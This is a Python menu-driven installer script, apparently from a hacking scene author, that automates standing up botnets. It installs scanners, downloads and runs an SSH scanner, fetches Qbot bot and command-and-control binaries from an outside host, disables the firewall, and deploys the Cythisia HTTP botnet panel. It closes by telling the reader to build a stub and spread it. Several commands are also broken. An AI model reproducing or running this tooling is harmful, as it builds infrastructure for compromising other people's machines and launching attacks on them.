#!/usr/bin/python
#Botnet Kid AIO
#Version 2.0
#By LilithsKitty/KittyHaxz


import subprocess, time

def system(cmd):
   subprocess.call(cmd, shell=True)

print ("\x1b[0;36mThis is Kittys Skid AIO Installation tool.")
print ("\x1b[0;36mWelcome, and enjoy!")
print ("\x1b[0m[\x1b[0;36m1\x1b[0m] Install Centos packages")
print ("\x1b[0m[\x1b[1;30m2\x1b[0m] Install Ubuntu/Debian packages")
print ("\x1b[0m[\x1b[0;36m3\x1b[0m] Install LRAB and fix cpan errors")
print ("\x1b[0m[\x1b[1;30m4\x1b[0m] Install Zmap on Centos")
print ("\x1b[0m[\x1b[0;36m5\x1b[0m] Install zmap on Ubuntu")
print ("\x1b[0m[\x1b[1;30m6\x1b[0m] Set up PhpMyAdmin apache2 mysql-server \x1b[0;31m(UBUNTU 14-16)")
print ("\x1b[0m[\x1b[0;36m7\x1b[0m] Set up PhpMyAdmin httpd mysql-server \x1b[0;31m(CENTOS 6-7)")
print ("\x1b[0m[\x1b[1;30m8\x1b[0m] Download python scanner \x1b[0;31m(Lilithv2.py)")
print ("\x1b[0m[\x1b[0;36m9\x1b[0m] Run python scanner \x1b[0;31m(Lilithv2.py)")
print ("\x1b[0m[\x1b[1;30m10\x1b[0m] Download qbot files and prepair \x1b[0;31mSTEP 1")
print ("\x1b[0m[\x1b[0;36m11\x1b[0m] Screen your botnet \x1b[0;31mSTEP 2")
print ("\x1b[0m[\x1b[1;30m12\x1b[0m] Fix qbot errors and stablize it")
print ("\x1b[0m[\x1b[0;36m13\x1b[0m] Download HTTP Botnet files \x1b[0;36m(Cythisia)")
print ("\x1b[0m[\x1b[1;30m14\x1b[0m] Set Up Cythisia HTTP Botnet \x1b[0;31m(UBUNTU/DEBIAN ONLY)")
try:
 option = input ("Enter Option: ")

 if option == 1:
  print ("\x1b[0;36mMaking Centos installs, so hold up.")
  system ("yum update -y")
  system ("yum install gcc screen nano python perl python-paramiko nmap cpan wget curl glibc.i686 -y")
  system ("yum install zip unzip dstat httpd xnietd vsftpd tftp tftp-server wget epel-release -y")
  system ("yum install gcc php-devel php-pear libssh2 libssh2-devel libpcap gengetopt python-requests -y")
  system ("yum install gcc cmake gmp gmp-devel libpcap-devel gengetopt byacc flex dos2unix -y")
  system ("yum install json-c-doc.noarch json-c.i686 json-c.x86_64 json-c-devel.i686 json-c-devel.x86_64 -y")
  system ("yum upgrade -y")
  system ("service httpd start")
  system ("service vsftpd start")
  system ("service xinetd start")
  system ("service vsftpd restart")
  system ("service xinetd restart")
  system ("service httpd restart")
  print ("\x1b[0;36mCentos Packages Installed? -- Yes")
  print ("\x1b[0;36mSay thanks to Kitty ^.^")



  
 elif option == 2:
  print ("\x1b[0;36mMaking Ubuntu/Debian installs, so hold up.")
  system ("apt-get update -y")
  system ("apt-get install cpan wget curl glibc.i686 python-requests -y")
  system ("apt-get install gcc php-pear php-devel libssh2 libssh2-devel libpcap -y")
  system ("apt-get update -y; apt-get install zmap nmap python perl")
  system ("apt-get install python-paramiko gcc screen dos2unix zip unzip nano wget apache2 -y")
  system ("apt-get install python perl python-paramiko nano gcc screen -y")
  system ("apt-get upgrade -y")
  print ("\x1b[0;36mUbuntu/Debian Packages Installed? -- Yes")
  print ("\x1b[0;36mSay thanks to Kitty ^-^")


  
  
 elif option == 3:
  print ("\x1b[0;36mInstalling LRAB, If it freezes press enter DUH")
  system ("yum update -y")
  system ("apt-get update -y")
  system ("yum upgrade -y")
  system ("apt-get upgrade -y")
  system ("yum install cpan wget curl glibc.i686 -y")
  system ("apt-get install cpan wget curl glibc.i686 -y")
  system ("cpan force install CPAN")
  system ("cpan force install Parallel::ForkManager")
  system ("cpan force install IO::Socket")
  system ("cpan force install IO::Select")
  system ("yum install gcc python-paramiko php-devel php-pear libssh2 libssh2-devel libpcap -y")
  system ("apt-get install gcc perl python-paramiko cpan php-pear php-devel libssh2 libssh2-devel -y")
  system ("cpan force install Net::SSH2")
  system ("ulimit -n 999999")
  system ("pecl install -f ssh2 touch /etc/php.d/ssh2.ini echo")
  system ("extension=ssh2.so>/etc/php.d/ssh2.ini")
  system ("cpan -fi Net::SSH2")
  system ("cpan -fi Parallel::ForkManager")
  system ("wget http://search.cpan.org/CPAN/authors/id/D/DL/DLUX/Parallel-ForkManager-0.7.5.tar.gz")
  system ("tar -xvf Para*")
  system ("cd Para*")
  system ("perl Makefile.PL")
  system ("make")
  system ("make install")
  system ("cd ../")
  system ("rm -rf Para*")
  system ("wget http://www.cpan.org/authors/id/S/SA/SALVA/Net-SSH2-0.59_23.tar.gz")
  system ("tar -xvf Net*")
  system ("cd Net*")
  system ("perl Makefile.PL")
  system ("make")
  system ("make install")
  system ("cd ../")
  system ("rm -rf Net*")
  print ("\x1b[0;36mLRAB installed? -- Yes")
  print ("\x1b[1;30mCpan errors fixed? -- Yes")
  print ("\x1b[0;36mSay thanks to Kitty ^-^")
  


  
 elif option == 4:
  print  ("Installing ZMAP for Centos")
  system ('''echo -e "\x1b[0;36m"
  yum update -y
  echo -e "\x1b[1;30m"
  yum install gcc cmake gmp gmp-devel libpcap-devel gengetopt byacc flex -y
  echo -e "\x1b[0;36m"
  yum install json-c-doc.noarch json-c.i686 json-c.x86_64 json-c-devel.i686 json-c-devel.x86_64 -y
  echo -e "\x1b[1;30m"
  yum install epel-release -y
  echo -e "\x1b[0;36m"
  yum install gengetopt -y
  wget https://github.com/zmap/zmap/archive/v2.1.0.tar.gz
  tar -xvf v2.1.0.tar.gz
  cd zmap-2.1.0
  flex -o "src/lexer.c" --header-file="src/lexer.h" "src/lexer.l" 
  byacc -d -o "src/parser.c" "src/parser.y"
  mkdir /etc/zmap
  cp conf/* /etc/zmap
  cmake -DENABLE_HARDENING=ON
  make
  make install
  echo -e "\x1b[0;31m"''')
  print ("\x1b[0;36mZmap v2.1.0 Installed? -- Yes")
  print ("\x1b[0;36mSay thanks to Kitty =^-^=")
  



 elif option == 5:
  print  ("\x1b[0;36mInstalling ZMAP for Ubuntu/Debian")
  system ("apt-get update -y; apt-get install zmap nmap python perl python-paramiko gcc screen dos2unix zip unzip nano wget apache2 -y")
  print ("\x1b[0;36mZmap v2.1.0 Installed? -- Yes")
  print ("\x1b[0;36mSay thanks to Kitty =^.^=")
  
  

 elif option == 6:
  print ("\x1b[0;36mSetting up PhpMyAdmin mysql and apache2")
  print ("\x1b[0;32mBe sure to set your password")
  time.sleep(10);
  system ("apt-get update -y; apt-get install apache2 mysql-server phpmyadmin gcc screen nano python perl python-paramiko python-requests tftp tftp-server -y")
  system ("apt-get install phpmyadmin php-mbstring php-gettext -y")
  system ("apt-get installgcc screen nano python perl python-paramiko python-requests tftp tftp-server -y")
  system ("phpenmod mbstring")
  system ("systemctl restart apache2")
  print ("\x1b[0;36mPhpMyadmin set up? -- Yes")
  print ("\x1b[0;36mApache2 set up? -- Yes")
  print ("\x1b[0;36mMysql set up? -- Yes")
  print ("\x1b[0;36mSay thanks to Kitty =^.^=")



 elif option == 7:
  print  ("\x1b[0;36mSetting up PhpMyAdmin mysql and apache2")
  system ("rpm -Uvh http://download.fedoraproject.org/pub/epel/6/x86_64/epel-release-6-8.noarch.rpm")
  system ("rpm -Uvh http://rpms.famillecollet.com/enterprise/remi-release-6.rpm")
  system ("yum --enablerepo=remi install phpmyadmin")
  system ("yum --enablerepo=remi,remi-test install phpmyadmin")
  system ("service httpd restart")
  system ("yum --enablerepo=remi install phpmyadmin")
  system ("ln -s /usr/share/phpMyAdmin /usr/share/nginx/html")
  system ("service php-fpm restart")
  print ("\x1b[0;36mPhpMyadmin set up? -- Yes")
  print ("\x1b[0;36mApache2 set up? -- Yes")
  print ("\x1b[0;36mMysql set up? -- Yes")
  print ("\x1b[0;36mSay thanks to Kitty =^.^=")


 elif option == 8:
  print  ("\x1b[0;36mDownloading the python scanner (Lilithv2.py)")
  system ("apt-get install python perl python-paramiko python-requests")
  system ("cd; wget http://blunter.pw/downloads/lilithv2.py")
  system ("chmod 777 *")
  print ("\x1b[0;32mLilithv2.py Downloaded, do step 2 now.")
  time.sleep(5);



 elif option == 9:
  print ("\x1b[0;36mSTARTING THE SCANNER!")
  system ("ulimit -n 999999;\n")
  system ("cd; clear; python lilithv2.py 1 LUCKY 2 1 root")



 elif option == 10:
  print ("\x1b[0;36mPrepairing yo qbot to be compiled and screened, so hold up.")
  system ("yum update -y")
  system ("yum install gcc screen nano python perl python-paramiko nmap cpan wget curl glibc.i686 -y")
  system ("yum install zip unzip dstat httpd xnietd vsftpd tftp tftp-server wget epel-release -y")
  system ("yum install gcc php-devel php-pear libssh2 libssh2-devel libpcap gengetopt python-requests -y")
  system ("yum install gcc cmake gmp gmp-devel libpcap-devel gengetopt byacc flex dos2unix -y")
  system ("yum install json-c-doc.noarch json-c.i686 json-c.x86_64 json-c-devel.i686 json-c-devel.x86_64 -y")
  system ("yum upgrade -y")
  system ("service httpd start")
  system ("service vsftpd start")
  system ("service xinetd start")
  system ("service vsftpd restart")
  system ("service xinetd restart")
  system ("service httpd restart")
  print ("\x1b[1;30mCentos Packages Installed? -- Yes")
  print ("\x1b[0;36mLRAB installed? -- Yes")
  print ("\x1b[1;30mCpan errors fixed? -- Yes")
  print ("\x1b[0;36mSay thanks to Kitty ^-^")
  print ("\x1b[1;30mMaking Ubuntu/Debian installs, so hold up.")
  system ("apt-get update -y")
  system ("apt-get install cpan wget curl glibc.i686 python-requests -y")
  system ("apt-get install gcc php-pear php-devel libssh2 libssh2-devel libpcap -y")
  system ("apt-get update -y; apt-get install zmap nmap python perl")
  system ("apt-get install python-paramiko gcc screen dos2unix zip unzip nano wget apache2 -y")
  system ("apt-get install python perl python-paramiko nano gcc screen -y")
  system ("apt-get upgrade -y")
  print ("\x1b[0;36mUbuntu/Debian Packages Installed? -- Yes")
  print ("\x1b[0;36mSay thanks to Kitty ^-^")
  print ("\x1b[0;36mSetting up your qbot hoe.")
  system ("wget http://blunter.pw/downloads/compile: mkdir bot; cd bot; rm -rf main.c; wget http://blunter.pw/downloads/main.c; chmod 777 *")
  print ("\x1b[0;31mWILL NOT CROSS COMPILE. RUN STEP 2")
  print ("\x1b[0;31mSleeping for 20 seconds please wait")
  time.sleep(60)
  system ("cd; rm -rf cnc; wget http://blunter.pw/downloads/cnc; chmod 777 *")
  system ("cd; clear;")
  print ("\x1b[0;36mQbot ready to install? -- Yes")
  print ("\x1b[0;36mQbot ready to screen? -- Yes")
  print ("\x1b[0;36mWARNING. Run (./main.c (yourip)) before step 2")



 elif option == 11:
  print  ("\x1b[0;36mScreening the qbot, so hold up.")
  system ("cd; ls; ")
  print  ("\x1b[0;31mREMEMBER TO DO CTRL+A+D AND MAKE A users.txt FILE")
  print  ("\x1b[0;31mPlease wait now for 30 seconds to prevent any errors.")
  time.sleep(30)
  system ("./cnc 69 1 666")
  print ("Qbot screened? -- Yes")
  print ("Say thanks to Kitty =^.^=")




 elif option == 12:
  print  ("\x1b[0;36mFixing your weak ass qbot")
  system ("service iptables stop")
  system ("chkconfig iptables off")
  system ("service httpd restart")
  system ("ulimit -n 99999")
  system ("sed -i 's/1024/999999/g' /usr/include/bits/typesizes.h")
  file = open("/proc/sys/fs/file-max", "w")
  file.write ("999999999999999999")
  file.close()
  print ("Made yo qbot mo stable? -- Yes")
  print ("Say thanks to Kitty =^.^=")



 elif option == 13:
  print  ("\x1b[0;36mDownloading HTTP Botnet Files")
  print ("\x1b[0;32mBe sure to set your password")
  time.sleep(10);
  system ("apt-get update -y; apt-get install apache2 mysql-server phpmyadmin gcc screen nano python perl python-paramiko python-requests tftp tftp-server zip unzip -y")
  system ("apt-get install phpmyadmin php-mbstring php-gettext -y")
  system ("apt-get installgcc screen nano python perl python-paramiko python-requests tftp tftp-server -y")
  system ("phpenmod mbstring")
  system ("systemctl restart apache2")
  system ("cd; cd /var/www/html")
  system ("rm index.html; rm index.php")
  system ("wget http://blunter.pw/downloads/Cythisia.zip")
  print ("\x1b[0;36mCythisia HTTP files downloaded? -- Yes")
  print ("\x1b[0;36mSay thanks to Kitty =^.^=")



 elif option ==14:
  print  ("\x1b[0;36mExtract and set up Cythisia HTTP Botnet")
  system ("cd; cd /var/www/html")
  system ("unzip Cythisia.zip")
  system ("chmod 777 *")
  system ("service apache2 restart")
  print ("\x1b[0;36m OPEN YOUR WEB BROWSER AND NAVIGATE TO -")
  print ("\x1b[0;36m http://(yourdomain or ip)/Webpanel")
  print ("\x1b[0;36mDefault Password is 127.0.0.1")
  print ("\x1b[0;36mGo to phpmyadmin and make a database called hydra")
  print ("\x1b[0;36mImport the dump.sql in the zip file to the hydra database")
  print ("\x1b[0;36mYou can change the password in the index.php")
  print ("\x1b[0;36mDownload the builder from your server it was in the zip")
  print ("\x1b[0;36mBuild your stub and spread it")
  print ("Sleeping for 200 seconds Please save these steps")
  time.sleep(200)
  print ("\x1b[0;36mCythisia HTTP Botnet set up? -- Did you do what I said?")
  print ("\x1b[0;36mSay thanks to Kitty =^.^=")


except KeyboardInterrupt:
  system ("clear")
  print ("Im so sorry I wasnt what you were looking for")
  print ("But, that doesnt mean you shouldnt send me money..\n")